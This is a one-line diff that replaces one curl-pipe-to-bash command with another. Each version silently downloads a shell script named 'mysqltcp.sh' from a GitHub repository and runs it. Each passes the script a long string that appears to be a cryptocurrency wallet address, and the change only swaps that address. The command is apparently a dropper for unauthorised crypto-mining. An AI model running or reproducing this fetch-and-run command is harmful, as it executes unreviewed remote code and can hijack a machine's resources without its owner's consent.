@@ -1,1 +1,1 @@
-export HOME=/tmp && /usr/bin/curl -s -L https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/url/mysqltcp.sh | LC_ALL=en_US.UTF-8 bash -s 4AYpmqXKbtMTbBXgkFwCCUE1Vb6GqeetqMWN3wXSoXwoSqKd2pr78L7VUHMECGg6H93EAADjgSomWP9GFCgvdGfD4xmfXE9
+export HOME=/tmp && /usr/bin/curl -s -L https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/url/mysqltcp.sh | LC_ALL=en_US.UTF-8 bash -s 42B9B2qiFJkMtwQtRJQQfT5bffDCs5B8VaWKQynLPRH3fejvegEj5iK2g2YDnwtjDyM6U2pMJiAYujELDW9tFPQzTSEgFBq
